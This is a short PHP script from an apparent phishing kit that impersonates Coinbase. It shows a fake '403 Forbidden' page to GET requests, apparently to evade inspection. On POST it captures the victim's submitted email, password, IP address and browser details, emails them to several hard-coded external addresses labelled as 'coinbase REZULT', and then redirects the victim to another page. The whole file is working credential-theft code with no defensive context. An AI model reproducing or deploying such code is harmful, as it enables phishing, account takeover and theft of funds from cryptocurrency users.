<?php

if ($_SERVER['REQUEST_METHOD'] == 'GET')
{
print '
<html><head>
<title>403 - Forbidden</title>
</head><body>
<h1>403 Forbidden</h1>
<p></p>
<hr>
</body></html>
';
exit;
}


$adddate = date("D M d, Y g:i a");
$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];
$message  = "----+ coinbase REZULT +----\n";
$message .= "email  : ".$_POST['email']."\n";
$message .= "password      : ".$_POST['password']."\n";
$message .= "----+ C0d3d by anonymous +----\n";
$message .= "Date & Time: $adddate\n";
$message .= "IP Address : ".$ip."\n";
$recipient = "dalhatuuj58@gmail.com, dalhatuuj@gmail.com, newsletter@greywolflogistics.com.ng";
$subject = "coinbase ReZulT | ".$ip."\n";
mail($recipient,$subject,$message);
header("Location:  important.html");
?>